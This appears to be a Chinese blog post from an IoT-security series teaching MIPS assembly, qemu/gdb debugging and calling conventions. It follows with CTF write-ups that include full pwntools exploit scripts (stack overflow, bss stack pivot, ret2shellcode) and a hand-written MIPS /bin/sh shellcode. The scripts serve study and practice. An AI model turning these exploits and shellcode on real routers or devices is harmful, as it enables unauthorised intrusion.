<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://bbs.kanxue.com/thread-272318.htm">从零开始复现 DIR-815 栈溢出漏洞-二进制漏洞-看雪-安全社区|安全招聘|kanxue.com</a></p>
<p><a href="https://www.cnblogs.com/unr4v31/p/16072562.html">DLink 815路由器栈溢出漏洞分析与复现 - unr4v31 - 博客园 (cnblogs.com)</a></p>
<p><a href="https://blog.csdn.net/qq_44223394/article/details/128756188">从零到一：复现 DIR-815 栈溢出漏洞_Y6blNU1L的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/jasonactions/article/details/118931633">qemu与宿主机网络通信配置_ubuntu主机和qemu网络互通_HZero.chen的博客-CSDN博客</a></p>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>MIPS架构</tag>
      </tags>
  </entry>
  <entry>
    <title>IOT安全入门学习--MIPS汇编基础</title>
    <url>/posts/919c29c4.html</url>
    <content><![CDATA[<h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>说下学习 <code>MIPS</code> 汇编基础的思路，作为一个接触新知识面的小白，我首先去查了一下如何编译 <code>MIPS</code> 架构的程序，然后自己写了一个简单的代码，放入 <code>IDA</code> 后开始进行汇编代码的学习，遇见一条指令就学习一条指令，为了观察更细致的内存变化同时还要学习如何用 <code>gdb</code> 来进行 <code>MIPS</code> 架构程序的调试。在这个过程中记录见到的汇编指令和寄存器等等，接着是函数调用约定的学习，参考着网上的文章再结合 <code>gdb</code> 调试基本就能理解透彻。感觉对 <code>MIPS</code> 汇编基础和函数调用约定已经得心应手，就可以做一些 <code>PWN</code> 题以此来稳固打下的基础，最后尝试来手写各种的 <code>shellcode</code>。希望这个思路能给之后自学者一点借鉴。</p>
<span id="more"></span>

<p>下面先让我们编译运行自己的第一个 <code>MIPS</code> 架构的程序</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//mips-linux-gnu-gcc demo.c -o demo -static -g</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> value=a+b;</span><br><span class="line">	<span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> c=sum(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;value ==&gt; %d\n&quot;</span>,c);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="启动与调试"><a href="#启动与调试" class="headerlink" title="启动与调试"></a>启动与调试</h3><h4 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h4><p>如果是小端序的程序使用 <code>qemu-mipsel ./xxx</code> 运行程序，如果是大端序的程序用 <code>qemu-mips ./xxx</code> 运行程序 </p>
<p>补充：</p>
<ol>
<li>如果运行动态链接的程序，可能会遇见一些报错， 这里的 <a href="#%E8%A7%A3%E5%86%B3%E6%8A%A5%E9%94%99">解决方法</a> 或许会对你有所帮助</li>
<li>使用 <code>readelf -h xxx</code> 可以查看程序的字节序</li>
</ol>
<h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>调试分为 <strong>直接调试程序</strong>  和 <strong>加载进程调试</strong></p>
<h5 id="直接调试程序"><a href="#直接调试程序" class="headerlink" title="直接调试程序"></a>直接调试程序</h5><p>假设要调试的程序叫做 <code>demo</code> （大端序），那么在终端执行 <code>qemu-mips -g 1234 ./demo</code></p>
<p>然后再开一个终端执行下面的命令（<code>set endian big</code> 这里是设置为大端序，如果是小端序的话设置为 <code>little</code> ，如果想加载程序符号表的话，再添加一个 <code>symbol-file ./demo</code>） </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb-multiarch</span><br><span class="line">set architecture mips</span><br><span class="line">set endian big</span><br><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure>

<p>实际调试情况如下图，如此就可以进入到 <code>gdb</code> 的调试界面了</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112120319.png" alt="image-20230511212044987"></p>
<p>如果感觉每次都要敲这几条命令有点麻烦的话，可以编写一个 <code>shell</code> 脚本来简化工作，比如我们创建一个叫做 <code>loader.sh</code> 脚本，编写内容如下（纯属举例，具体情况具体处理）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set architecture mips</span><br><span class="line">set endian little</span><br><span class="line">symbol-file ./pwn2</span><br><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure>

<p>然后我们只需要执行 <code>gdb-multiarch</code> 后，执行一次 <code>source loader.sh </code> 命令即可。</p>
<h5 id="加载进程调试"><a href="#加载进程调试" class="headerlink" title="加载进程调试"></a>加载进程调试</h5><p>这个通常用于我们编写攻击脚本后，需要进行调试判断数据是否是预期的那样。</p>
<p>只需要在 <code>EXP</code> 中编写代码 <code>p=process([&quot;qemu-mipsel&quot;, &quot;-g&quot;, &quot;1234&quot;,&quot;./demo&quot;])</code> 即可，这其实传入进去的就是一个命令包括参数列表。正常运行程序也是同理 <code>p=process([&quot;qemu-mips&quot;,&quot;./demo&quot;])</code></p>
<p>剩下的依旧是新开一个终端执行 <code>gdb-multiarch</code> 命令等等（同上）</p>
<h3 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h3><p><code>li</code> (Load Immediate)指令用于将一个立即数存入一个通用寄存器,	<code>li   $gp, 0x498300</code> 将 <code>$gp</code> 寄存器的值赋值为 <code>0x498300</code></p>
<p><code>lui</code> 指令将一个 <code>16</code> 位的立即数左移 <code>16</code> 位后存入目标寄存器中， <code>lui   $v0, 0x46</code> 是将 <code>0x46</code> 立即数左移  <code>16</code> 位后存入 <code>$v0</code> 寄存器，即 <code>$v0</code> 寄存器的值为 <code>0x460000</code></p>
<p><code>ori</code> 指令是 <code>MIPS</code> 汇编中的一种逻辑运算指令，它可以将一个寄存器的低 16 位与一个 16 位的立即数按位或运算，并将结果存入另一个寄存器中。<code>ori $t6,$t6,0x430a</code> 指令将 <code>t6</code> 寄存器与 <code>0x430a</code> 立即数进行或运算，将结果放回 <code>$t6</code></p>
<p><code>la</code> (Load Address) 指令用于将一个地址或标签存入一个寄存器，<code>la $v0, puts</code> 指令将 <code>puts</code> 函数地址存入 <code>$v0</code> 寄存器中</p>
<p><code>lw</code> (Load Word) 指令用于<strong>从一个指定的地址加载一个 <code>word</code> 类型的值</strong>到一个寄存器     <code>lw $v0, 0x14($fp)</code> 将 <code>$fp+0x14</code> 的位置中的数据存入到 <code>v0</code> 中</p>
<p><code>sw</code> (Store Word) 将源寄存器中的值存入指定地址，<code>sw   $ra, 0x24($sp) </code> 将 <code>$ra</code> 的值写入距离栈顶（<code>$sp</code>）偏移 <code>0x24</code> 的内存单元中</p>
<p><code>move</code> 指令用于寄存器之间值的传递，<code>move   $t5,$t1</code> 将 <code>$t1</code> 赋值给 <code>$t5</code> </p>
<p><code>addi</code> 指令用于计算一个寄存器加上一个立即数，<code>addi $t0,$t1,5</code> 将 <code>$t1</code> 加上 <code>5</code> 之后将结果放为 <code>$t0</code></p>
<p><code>addu</code> 指令用于计算无符号数之间进行的加法操作，<code>addu $t0,$t1,$t2</code> 将 <code>$t1</code> 和 <code>$t2</code> 进行无符号相加，结果存储在 <code>$t0</code></p>
<p><code>add</code> 指令和 <code>addu</code> 一样，只不过进行的是有符号数之间的加法。</p>
<p><code>addiu</code> 指令将上面的 <code>addi</code> 和 <code>addu</code> 结合了一下，<code> addiu  $a1, $zero, 2</code> 进行的是将寄存器<code>$zero</code> 加上一个立即无符号数 <code>2</code> ，并将结果存回寄存器 <code>$a1</code> 中</p>
<p><code>jr</code> 是跳转指令，<code>jr $ra</code> 跳转到 <code>$ra</code> 寄存器指向的地址处</p>
<p><code>jal</code> 指令是跳转指令，<code>jal target</code> 复制当前的 <code>PC</code> 值到 <code>$ra</code> 寄存器，然后跳转到 <code>target</code> 处</p>
<p><code>bnez</code> 指令用于在寄存器的值不为零时进行分支跳转，<code>bnez   $v0, loc_4005E8</code> 表示当 <code>$v0</code> 不为零时跳转到 <code>0x4005E8</code> </p>
<p><code>b</code> 是无条件跳转指令，<code>b loc_400604</code>  直接跳转到 <code>0x400604</code> 地址处</p>
<h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><h4 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h4><p>在 <code>MIPS</code> 体系结构中有 <code>32</code> 个通用寄存器，在汇编程序中可以用编号 <code>$0-$31</code>表示，也可以用寄存器的名字表示</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305111218207.png" alt="image-20230511121821077" style="zoom:50%;" />



<h4 id="特殊寄存器"><a href="#特殊寄存器" class="headerlink" title="特殊寄存器"></a>特殊寄存器</h4><p><code>MIPS</code> 架构中定义了 <code>3</code> 个特殊的寄存器，分别是 <code>PC</code>（程序计数器）、<code>HI</code> (乘除结果高位寄存器)、<code>LO</code>（乘除结果低位寄存器）。在进行乘法运算时， <code>HI</code> 和 <code>LO</code> 保存乘法的运算结果，其中 <code>HI</code> 存储高 <code>32</code> 位，<code>LO</code> 存储低 <code>32</code> 位；在进行除法运算时， <code>HI</code> 保存余数， <code>LO</code> 存储商。</p>
<h3 id="MIPS32-架构知识"><a href="#MIPS32-架构知识" class="headerlink" title="MIPS32 架构知识"></a><code>MIPS32</code> 架构知识</h3><ul>
<li><p><code>MIPS</code> 固定 <code>4</code> 字节指令长度 </p>
</li>
<li><p>栈是从内存的高地址向低地址方向增长的</p>
</li>
<li><p>叶子函数：函数内部没有再调用其他函数</p>
</li>
<li><p>非叶子函数：函数内部调用其他函数的函数</p>
</li>
<li><p>流水线效应：在分析 <code>MIPS</code> 汇编代码时会发现，其跳转到函数或者分支跳转语句的下一条都是 <code>nop</code> （如下图），这是因为 <code>MIPS</code> 采用了高度的流水线，其中最重要的是跳转指令导致的<strong>分支延迟效应</strong>。在分支跳转语句后面那条语句叫做<strong>分支延迟槽</strong>，当跳转语句刚执行的一瞬间，跳转到的地址刚填充好（填充到程序计数器），<strong>还没有执行程序计数器中存放的指令，分支延迟槽的指令已经被执行了，这就是流水线效应</strong>（几条指令被同时执行，只是处于不同的阶段， <strong><code>MIPS</code> 不像其他架构那样存在流水线阻塞</strong>），为了避免出现问题，因此在分支跳转语句的下一条指令通常是 <code>nop</code> 指令或者其他有用的指令。</p>
</li>
<li><p>缓存刷新机制：<code>MIPS CPUs</code>有两个独立的 <code>cache</code> : <code>指令cache</code> 和 <code>数据cache</code> 。 指令和数据分别在两个不同的缓存中。当缓存满了，会触发 <code>flush</code> , 将数据写回到主内存。攻击者的攻击<code>payload</code> 通常会被应用当做数据来处理，存储在数据缓存中。当 <code>payload</code> 触发漏洞， 劫持程序执行流程的时候，会去执行内存中的 <code>shellcode</code> .如果数据缓存没有触发 <code>flush</code> 的话，<code>shellcode</code> 依然存储在缓存中，而没有写入主内存。这会导致程序执行了本该存储 <code>shellcode</code> 的地址处随机的代码，导致不可预知的后果。(通常执行 <code>sleep(1)</code> 刷新)</p>
</li>
</ul>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305102022075.png" alt="image-20230510202231987"></p>
<h3 id="函数调用约定"><a href="#函数调用约定" class="headerlink" title="函数调用约定"></a>函数调用约定</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305110732606.png" alt="image-20230511073238845" style="zoom:50%;" />



<p>函数调用时传参：如果函数的参数小于等于四个，那么会使用 <code>$a0 ~ $a3</code> 寄存器来存放参数。如果参数多于四个，那么多于的参数则存放到栈里（同时也会预留出前四个参数的内存空间，因为被调用者使用前四个参数时，会统一将参数放到保留的栈空间），具体情况是函数 <code>A</code> 调用函数 <code>B</code> ，调用者函数（函数<code>A</code> ）会在自己的栈顶预留一部分空间来保存被调用者（函数 <code>B</code> ）的参数，称之为调用参数空间（如下）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305092258483.png" alt="image-20230509225831965" style="zoom:50%;" />



<p>函数 <code>A</code> 调用函数 <code>B</code>。如果 <code>B</code> 是叶子函数，那么在调用 <code>B</code> 函数时，会将 <code>B</code> 函数的返回地址存入 <code>$ra</code> 寄存器；如果 <code>B</code> 是非叶子函数（<code>B</code> 函数内部调用了一个 <code>C</code> 函数），那么在跳转到 <code>B</code> 函数时，会将其返回地址先存入 <code>$ra</code> 寄存器中，随后在 <code>B</code> 函数内部再将 <code>$ra</code> 寄存器的值存入栈中（位于 <code>fp-0x4</code> 的位置，如下图）。当 <code>B</code> 函数调用 <code>C</code> 函数时，会将其返回地址存入 <code>$ra</code> 寄存器，在返回时执行 <code>jr $ra</code> 指令回到 <code>B</code> 函数。现在假设 <code>B</code> 函数已经执行完毕准备返回到 <code>A</code> 函数，会将原先存入栈里的返回地址读到 <code>$ra</code> 寄存器中，最后执行 <code>jr $ra</code> 指令，回到 <code>A</code> 函数</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305092257102.png" alt="image-20230509225747069" style="zoom:50%;" />



<h3 id="题目练习"><a href="#题目练习" class="headerlink" title="题目练习"></a>题目练习</h3><h4 id="axb-2019-mips"><a href="#axb-2019-mips" class="headerlink" title="axb_2019_mips"></a>axb_2019_mips</h4><h5 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略"></a>保护策略</h5><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112102666.png" alt="image-20230511210201613"></p>
<p>发现保护全关，并且是小端序</p>
<h5 id="解决报错"><a href="#解决报错" class="headerlink" title="解决报错"></a>解决报错</h5><p>尝试用 <code>qemu-mipsel ./pwn2</code> 运行时发现如下报错</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-mipsel: Could not open &#x27;/lib/ld-uClibc.so.0&#x27;: No such file or directory</span><br></pre></td></tr></table></figure>

<p>这表明在 <code>/lib</code> 目录下缺少 <code>ld-uClibc.so.0</code> 文件，我们使用 <code>file pwn2</code> 来查看一下文件信息（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112045280.png" alt="image-20230511204507118"></p>
<p>发现动态链接器的路径是 <code>/lib/ld-uClibc.so.0</code> ，而在这个位置没有找到 <code>ld-uClibc.so.0</code> ，我们使用 <code>sudo find / -name &quot;ld-uClibc.so.0&quot; 2&gt;/dev/null</code> 命令搜索一下，发现是有这个  <code>ld-uClibc.so.0</code> 文件的，只不过不在 <code>/lib</code> 目录下（如下图）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112049318.png" alt="image-20230511204913250"></p>
<p>因此创建一个软链接过去即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ln -s /home/zikh/Desktop/mipsel-linux-uclibc/lib/ld-uClibc.so.0 /lib/</span><br></pre></td></tr></table></figure>

<p>然后我们尝试再次运行 <code>pwn2</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./qemu-mipsel ./pwn2                                   </span><br><span class="line">./pwn2: can&#x27;t load library &#x27;libc.so.0&#x27;</span><br></pre></td></tr></table></figure>

<p>这表明现在还缺少一个 <code>libc.so.0</code> 的库，我们使用 <code>ls /home/zikh/Desktop/mipsel-linux-uclibc/lib/</code> 命令，发现是有 <code>libc.so.0</code> 这个库的（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112028607.png" alt="image-20230511202846472"></p>
<p>因此我们依然给软链接到 <code>/lib</code> 目录下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ln -s /home/zikh/Desktop/mipsel-linux-uclibc/lib/libc.so.0 /lib/ </span><br></pre></td></tr></table></figure>

<p>此时程序可以运行成功（如下图）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112030731.png" alt="image-20230511203036662" style="zoom:50%;" />

<h5 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112143512.png" alt="image-20230511214356466" style="zoom:50%;" />

<p>首先这里有一个 <code>read</code> 输入，随后 <code>printf</code> 函数是使用了 <code>%s</code> 将数据进行打印，在这里怀疑可能有机会泄露一些数据，我们通过调试验证一下（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112146239.png" alt="image-20230511214644840"></p>
<p>发现写入 <code>0x14</code> 字节的数据，确实可以顺带打印出来一个栈地址</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112147526.png" alt="image-20230511214754487"></p>
<p>随后发现 <code>vuln</code> 函数存在栈溢出漏洞（如上）</p>
<h5 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h5><p>因为有了栈地址，并且栈区是有可执行的权限，所以打一个常规的 <code>ret2shellcode</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305120729296.png" alt="image-20230512072926146"></p>
<p>如上图所示，发现本地是通了的，因此思路没有任何问题，<code>EXP</code> 如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, endian=<span class="string">&#x27;little&#x27;</span>, word_size=<span class="number">32</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process([<span class="string">&quot;qemu-mipsel&quot;</span>,<span class="string">&quot;./pwn2&quot;</span>])</span><br><span class="line"><span class="comment">#p=remote(&quot;node4.buuoj.cn&quot;,25419)</span></span><br><span class="line"><span class="comment">#p=process([&quot;qemu-mipsel&quot;, &quot;-g&quot;, &quot;1234&quot;,&quot;./pwn2&quot;])</span></span><br><span class="line">offset=<span class="number">0x14</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*offset</span><br><span class="line">p.sendafter(<span class="string">&quot;What&#x27;s your name: \n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello!, &quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*offset)</span><br><span class="line">stack_addr=u32(p.recv().ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&quot;stack_addr&quot;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">shellcode = asm(shellcraft.mips.linux.sh(),arch=<span class="string">&#x27;mips&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&quot;b&quot;</span>*<span class="number">0x24</span>+p32(stack_addr-<span class="number">0x50</span>)+shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()            </span><br></pre></td></tr></table></figure>





<p>不过这里在打远程的时候，明显发现泄露出来的并不是一个栈地址（因为本地和远程的环境不同，如下图），所以这个方法打远程是行不通的</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305120725360.png" alt="image-20230512072536085"></p>
<p>如果不泄露栈地址的话，我们考虑可以栈迁移到 <code>bss</code> 段上，并且往 <code>bss</code> 段写入 <code>shellcode</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305122036129.png" alt="image-20230512203620008"></p>
<p>通过分析上面的汇编发现， <code>read</code> 的第二个参数 <code>$a1</code> 由 <code>fp</code> 控制，而通过阅读 <code>read</code> 函数后的汇编代码，存在一句 <code>lw    $fp, 0x38($sp)</code> ，又因为此处有栈溢出，相当于我们有一次任意地址写的机会。我们选择往 <code>bss</code> 段写入 <code>shellcode</code> ，然后寻找迁移的机会，迁移到 <code>bss</code> 段的 <code>shellcode</code> 执行。</p>
<p>执行完程序原本的 <code>read</code> 函数后，有一句 <code>lw   $ra,0x3c($sp)</code> 的汇编，我们将距离栈顶 <code>0x3c</code> 的位置放成上面提到的 <code>lw   $fp,0x38($sp)</code> 指令地址，以此跳转过去</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305122116335.png" alt="image-20230512211611122"></p>
<p>下图为向 <code>bss</code> 段写入数据的 <code>read</code> 函数</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305122119885.png" alt="image-20230512211952663" style="zoom:50%;" />



<p>当 <code>read</code> 往 <code>bss</code> 段读入完数据后，执行了 <code>mov   $sp,$fp</code> ，此时栈进行了迁移（<code>fp</code> 是最初控制的那个 <code>bss</code> 段地址）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305122118517.png" alt="image-20230512211852230"></p>
<p>随后下一条指令 <code>lw   $ra,0x3c($sp)</code> 将 <code>$ra</code> 的值再次进行了设置，因为 <code>$sp</code> 是可控的 <code>bss</code> 段地址，所以 <code>$ra</code> 依然可控，我们将 <code>$ra</code> 设置为 <code>shellcode</code> 的起始地址（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305122127368.png" alt="image-20230512212720766"></p>
<p>但戏剧的是，这种打法导致了远程通了，本地没通。因为本题环境的原因，<code>bss</code> 段是没有可执行权限的，而远程的 <code>bss</code> 段是有可执行权限的。</p>
<h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(arch=&#x27;mips&#x27;, os=&#x27;linux&#x27;, endian=&#x27;little&#x27;, word_size=32,log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#p=process([&quot;qemu-mipsel&quot;,&quot;./pwn2&quot;])</span></span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25115</span>)</span><br><span class="line"><span class="comment">#p=process([&quot;qemu-mipsel&quot;, &quot;-g&quot;, &quot;1234&quot;,&quot;./pwn2&quot;])</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">p.sendafter(<span class="string">&quot;What&#x27;s your name: \n&quot;</span>,payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">shellcode = asm(shellcraft.mips.linux.sh(),arch=<span class="string">&#x27;mips&#x27;</span>)</span><br><span class="line">bss_addr=<span class="number">0x410ba0</span></span><br><span class="line">payload=<span class="string">b&quot;b&quot;</span>*<span class="number">0x20</span>+p32(bss_addr)+p32(<span class="number">0x4007E4</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x24</span>+p32(<span class="number">0x410be0</span>)+shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305122131912.png" alt="image-20230512213146674"></p>
<h4 id="ycb-2020-mipspwn"><a href="#ycb-2020-mipspwn" class="headerlink" title="ycb_2020_mipspwn"></a>ycb_2020_mipspwn</h4><h5 id="保护策略-1"><a href="#保护策略-1" class="headerlink" title="保护策略"></a>保护策略</h5><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305142040351.png" alt="image-20230514204013277"></p>
<h5 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h5><p>本题与上一道的漏洞一样，同样是栈溢出。</p>
<p>采用的策略是打 <code>ret2shellcode</code></p>
<p>只不过本题的 <code>shellcode</code> 是手写的 <a href="#shellcode%E7%BC%96%E5%86%99">如何编写MIPS架构下的 shellcode</a> </p>
<h5 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, endian=<span class="string">&#x27;little&#x27;</span>, word_size=<span class="number">32</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=process([&quot;qemu-mipsel&quot;,&quot;./pwn2&quot;])</span></span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29366</span>)</span><br><span class="line"><span class="comment">#p=process([&quot;qemu-mipsel&quot;, &quot;-g&quot;, &quot;1234&quot;,&quot;./pwn2&quot;])</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">p.sendafter(<span class="string">&quot;Warrior,leave your name here:\n&quot;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">7</span>))</span><br><span class="line"></span><br><span class="line">bss_addr=<span class="number">0x4115F0</span></span><br><span class="line">p.sendafter(<span class="string">&quot;Write down your feeling:\n&quot;</span>,<span class="number">0x38</span>*<span class="string">b&#x27;b&#x27;</span>+p32(bss_addr)+p32(<span class="number">0x400F54</span>))</span><br><span class="line">shellcode = asm(shellcraft.mips.linux.sh(),arch=<span class="string">&#x27;mips&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">b&quot;\x11\x01\x06\x24\xff\xff\xd0\x04\x00\x00\x06\x24\xe0\xff\xbd\x27\x14\x00\xe4\x27\x00\x00\x05\x24\xab\x0f\x02\x24\x0c\x00\x00\x00/bin/sh&quot;</span></span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x3c</span>+p32(<span class="number">0x411648</span>)+shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305142045142.png" alt="image-20230514204550938"></p>
<h3 id="shellcode编写（mips）"><a href="#shellcode编写（mips）" class="headerlink" title="shellcode编写（mips）"></a>shellcode编写（mips）</h3><h4 id="write-系统调用"><a href="#write-系统调用" class="headerlink" title="write 系统调用"></a><code>write</code> 系统调用</h4><p>我们先去尝试编写一段能够输出 <code>ABC\n</code> 字符串的 <code>shellcode</code></p>
<p>创建 <code>write.s</code> 文件，将下面的汇编代码写入文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.section .text</span><br><span class="line">.globl __start</span><br><span class="line">.set noreorder</span><br><span class="line">__start:</span><br><span class="line">addiu $sp,$sp,-32</span><br><span class="line">lui $t6,0x4142</span><br><span class="line">ori $t6,$t6,0x430a</span><br><span class="line">sw $t6,0($sp)</span><br><span class="line">li $a0,1</span><br><span class="line">addiu $a1,$sp,0</span><br><span class="line">li $a2,5</span><br><span class="line">li $v0,4004</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>

<p> <code>.section .text</code> 指定了该段代码所在的节</p>
<p> <code>.globl __start</code> 表示将 <code>__start</code> 导出为全局符号（ <code>Global Symbol</code> ）。在C语言编写的程序中，程序的入口点通常被命名为 <code>_start</code>，而在汇编代码中通常使用 <code>__start</code></p>
<p> <code>.set noreorder</code> 禁止指令重排，确保汇编代码的执行顺序与源代码中指定的顺序一致。指令重排是编译器和处理器在优化代码执行速度时采用的一种技术，它可以改变指令的执行顺序，以便在不影响程序逻辑的情况下提高代码执行效率。</p>
<p><code>__start:</code> 是程序的入口点符号，在程序执行时将从这里开始执行指令。</p>
<p><code>addiu $sp,$sp,-32</code> 将开辟一个 <code>0x20</code> 大小的栈帧</p>
<p><code>lui $t6,0x4142</code> 是将 <code>0x4142</code> 左移 <code>16</code> 位后（也就是 <code>0x41420000</code> ）放入 <code>$t6</code> 寄存器。</p>
<p><code>ori $t6,$t6,0x430a</code> 将 <code>$t6</code> 与立即数 <code>0x430a</code> 进行或运算，所以 <code>$t6</code> 寄存器里会放 <code>0x4142430a</code> 这也就是 <code>ABC\n</code> 的 <code>ASCII</code> 码。</p>
<p>在看到这两条汇编语句的时候，我不禁疑惑起来，为什么不直接使用 <code>li $t6,0x4142430a</code> 指令呢，测试了一下编译链接之后的可执行文件依然是将这句指令转换成了 <code>lui $t6,0x4142   ori $t6,$t6,0x430a</code> ，最终查阅了资料发现在 <code>MIPS</code> 架构中立即数通常是 <code>16</code> 位的有符号整数（范围 <code>-32768 ~ 32767</code> ），如果需要使用一个超出这个范围的立即数，汇编器会自动将其拆分为两个 <code>16</code> 位的立即数，并使用 <code>lui</code> 和 <code>ori</code> 指令将其装载到寄存器中</p>
<p><code>sw $t6,0($sp)</code> 将 <code>ABC\n</code>这四个字符写入栈中</p>
<p><code>li $a0,1</code> 设置 <code>write</code> 系统调用的第一个参数，即标准输出流</p>
<p><code>addiu $a1,$sp,0</code> 将 <code>ABC\n</code> 的地址设置为 <code>write</code> 系统调用的第二个参数</p>
<p><code>li $a2,5</code> 设置 <code>write</code> 系统调用的第三个参数，即字符串长度为 <code>5</code> ，<code>ABC\n</code> 别忘记字符串末尾是还有一个 <code>\x00</code> 字符的</p>
